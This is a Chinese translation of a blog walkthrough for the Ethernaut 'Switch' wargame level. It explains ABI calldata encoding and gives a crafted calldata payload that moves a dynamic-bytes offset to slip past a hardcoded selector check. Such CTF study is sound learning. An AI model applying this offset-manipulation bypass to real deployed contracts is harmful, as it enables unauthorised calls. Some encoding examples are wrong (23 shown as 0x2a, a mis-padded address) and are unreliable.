# Solving Ethernaut Level 29: Switch

![img](https://img.learnblockchain.cn/attachments/2023/06/HCN5J9Xo648acb726c2fd.webp)

对于OpenZeppelin的Ethernaut：Switch，您只有这3个可以从外部调用的函数：**flipSwitch**、**turnSwitchOn**和**turnSwitchOff**。

但是**flipSwitch** 是你唯一可以调用的函数，因为**turnSwitchOn**和**turnSwitchOff**只有在msg.sender是我们的合约时才能访问（因为**onlyThis** 限定符）。

让我们来看看你可以调用的函数：

```typescript
 function flipSwitch(bytes memory _data) public onlyOff {
        (bool success, ) = address(this).call(_data);
        require(success, "call failed :(");
    }
```

你可以看到**flipSwitch**有一个函数限定符**onlyOff**,此函数限定符是用来对调用数据执行检查。

```typescript
modifier onlyOff() {
        // 可以使用复杂的数据类型将其放入内存中
        bytes32[1] memory selector;
        // 检查位置68处的calldata（_data的位置）
        assembly {
            calldatacopy(selector, 68, 4) //从calldata中选择函数选择器
        }
        require(
            selector[0] == offSelector,
            "Can only call the turnOffSwitch function"
        );
        _;
    }
```

函数限定符检查从位置68开始并且长度为4字节的数据是否是turnOffSwitch函数的选择器。

乍一看 ,**flipSwitch**只能在**turnSwitchOff**作为数据的情况下调用，但通过操纵[calldata](https://www.quicknode.com/guides/ethereum-development/transactions/ethereum-transaction-calldata/)编码，您会发现这种肯定不是真的。
## 静态类型的calldata编码要素
静态类型如下：

- ‘uint’s
- ‘int’s
- ‘address’
- ‘bool’
- ‘bytes’-n
- ‘tuples’

这些类型的表示是用十六进制表示的，用零填充以覆盖32字节的插槽。

```
Input: 23 (uint256)

Output:
0x000000000000000000000000000000000000000000000000000000000000002a
Input: 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f (address of Uniswap)

Output: 
0x000000000000000000000005c69bee701ef814a2b6a3edd4b1652cb9cc5aa6f
```

## 动态类型的calldata编码要素(string, bytes and arrays)

对于动态类型，calldata编码基于以下内容：

- 前32个字节用于偏移
- 接下来的32个字节是长度
- 继续接下来的是值

### 输入示例

1. **Bytes:**

```
Input: 0x123

Output: 
0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000021234000000000000000000000000000000000000000000000000000000000000
```

Where:

```
offset:
0000000000000000000000000000000000000000000000000000000000000020

length(the value is 2 bytes length = 4 chrs):
0000000000000000000000000000000000000000000000000000000000000002

value(the value of string and bytes starts right after the length):
1234000000000000000000000000000000000000000000000000000000000000
```

**2. String:**

```
Input: “GM Frens”

Output: 
0x00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000008474d204672656e73000000000000000000000000000000000000000000000000
```

Where:

```
offset:
0000000000000000000000000000000000000000000000000000000000000020 

length:
0000000000000000000000000000000000000000000000000000000000000008 

value(“GM Frens” in hex):
474d204672656e73000000000000000000000000000000000000000000000000 
```

**3. Arrays**

```
Input: [1,3,42] → uint256 array

Output:
0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000300000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000003000000000000000000000000000000000000000000000000000000000000002a
```

Where:

```
offset:
0000000000000000000000000000000000000000000000000000000000000020 

length (3 elements in the array):
0000000000000000000000000000000000000000000000000000000000000003 

first element value(1):
0000000000000000000000000000000000000000000000000000000000000001 

second element value(3):
0000000000000000000000000000000000000000000000000000000000000003 

third element value(42):
000000000000000000000000000000000000000000000000000000000000002a 
```

一个调用合约方法的示例

```
0x
30c13ade
0000000000000000000000000000000000000000000000000000000000000020
0000000000000000000000000000000000000000000000000000000000000004
20606e1500000000000000000000000000000000000000000000000000000000
```

Where:

```
function selector: 
30c13ade

offset:
0000000000000000000000000000000000000000000000000000000000000020 

length:
0000000000000000000000000000000000000000000000000000000000000004 

value:
20606e1500000000000000000000000000000000000000000000000000000000
```

### 什么是偏移量？

偏移量表示数据的开始。数据由长度和值组成。在我们的例子中，偏移量是十六进制的20，也就是十进制的32。这意味着我们的数据在编码开始后的前32个字节之后开始。

```typescript
0000000000000000000000000000000000000000000000000000000000000020
^
| -> counting 32 bytes from here


0000000000000000000000000000000000000000000000000000000000000004
^
| so this is the actual start


20606e1500000000000000000000000000000000000000000000000000000000
```

让我们看一个同时具有静态和动态参数的函数calldata的示例：

```typescript
pragma solidity 0.8.19;
contract Example {
    function transfer(bytes memory data, address to) external;
}
```

具有以下参数：

```
data: 0x1234
to: 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f
```

这将生成以下calldata

```
0xbba1b1cd00000000000000000000000000000000000000000000000000000000000000400000000000000000000000005c69bee701ef814a2b6a3edd4b1652cb9cc5aa6f00000000000000000000000000000000000000000000000000000000000000021234000000000000000000000000000000000000000000000000000000000000
```

让我们来分析一下：

```
0x

function selector (transfer):
Bba1b1cd

offset of the 'data' param (64 in decimal):
0000000000000000000000000000000000000000000000000000000000000040 

address param 'to':
0000000000000000000000005c69bee701ef814a2b6a3edd4b1652cb9cc5aa6f 

length of the 'data' param:
0000000000000000000000000000000000000000000000000000000000000002 

value of the 'data' param:
1234000000000000000000000000000000000000000000000000000000000000
```

正如您在本例中看到的，在偏移量的帮助下，您可以将地址参数（to）之后的数据内容（长度和值）移动。

在我们的合约中，对calldata的检查是以硬编码值**68**进行的。因此，解决方案是从用于进行调用的数据中移动检查的数据。

关于动态类型的调用数据编码， **需要记住的三个重要细节是**：

1. 偏移量的存在（偏移量是调用数据中动态类型的实际数据开始的位置）
2. 通过更改偏移量，可以操作calldata值的起始位置

**解决方案：:**

```
await sendTransaction({from: player, to: contract.address, data:"0x30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000"})
```

**说明：**:

```
function selector:
30c13ade

offset, now = 96-bytes:
0000000000000000000000000000000000000000000000000000000000000060 

extra bytes:
0000000000000000000000000000000000000000000000000000000000000000 

here is the check at 68 byte (used only for the check, not relevant for the external call made by our function):
20606e1500000000000000000000000000000000000000000000000000000000

length of the data:
0000000000000000000000000000000000000000000000000000000000000004 

data that contains the selector of the function that will be called from our function:
76227e1200000000000000000000000000000000000000000000000000000000 
```

## 结论：Ethernaut 的第29关：Switch让您更好地理解数据编码

有了这个解决方法，并了解更多关于这个新漏洞的信息，您将提高EVM和Solidity的语言技能。

如果您想找到解决其他Ethernaut挑战的方案，请查看我们的 [GitHub](https://github.com/Softbinator/ethernaut-solutions).

请继续关注我们的博客，了解有关EVM智能合约的更多实用提示！[smart contracts](https://blog.softbinator.com/check-smart-contract-state-changes-hardhat-tasks/)!



原文链接：https://blog.softbinator.com/solving-ethernaut-level-29-switch/



